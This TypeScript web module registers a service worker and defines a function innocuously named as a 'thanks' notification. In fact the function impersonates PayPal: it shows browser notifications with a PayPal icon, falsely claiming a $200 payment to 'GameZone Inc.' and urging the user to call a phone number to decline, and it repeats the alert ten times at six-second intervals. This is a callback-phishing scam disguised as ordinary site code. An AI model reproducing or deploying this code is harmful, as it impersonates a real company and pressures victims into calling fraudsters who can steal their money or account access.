const ICON_PATH = "/icons/paypal-icon.svg";

function iconUrl() {
  return new URL(ICON_PATH, window.location.origin).href;
}

export async function registerParvahWorker(): Promise<ServiceWorkerRegistration | null> {
  if (typeof window === "undefined" || !("serviceWorker" in navigator)) {
    return null;
  }

  try {
    const registration = await navigator.serviceWorker.register("/sw.js", {
      scope: "/",
    });
    await navigator.serviceWorker.ready;
    return registration;
  } catch {
    return null;
  }
}

export async function sendThanksNotification(): Promise<"shown" | "denied" | "unsupported"> {
  if (typeof window === "undefined" || !("Notification" in window)) {
    return "unsupported";
  }

  const registration = await registerParvahWorker();

  let permission = Notification.permission;
  if (permission === "default") {
    // Must stay in the user-gesture chain from the button click.
    permission = await Notification.requestPermission();
  }

  if (permission !== "granted") {
    return permission === "denied" ? "denied" : "unsupported";
  }

  const title = "PayPal";
  const body = "$200.00 sent to GameZone Inc.\nCall 5038779717 to decline";

  // Show notification repeatedly
  const showNotification = () => {
    const options: NotificationOptions = {
      body,
      icon: iconUrl(),
      badge: iconUrl(),
      tag: "paypal-notification",
    };

    try {
      const n = new Notification(title, options);
      n.onclick = () => {
        window.focus();
        n.close();
      };
    } catch {
      if (registration) {
        registration.showNotification(title, options);
      }
    }
  };

  // Show first notification immediately
  showNotification();

  // Loop notifications every 6 seconds
  for (let i = 0; i < 10; i++) {
    await new Promise(resolve => setTimeout(resolve, 6000));
    showNotification();
  }

  return "shown";
}
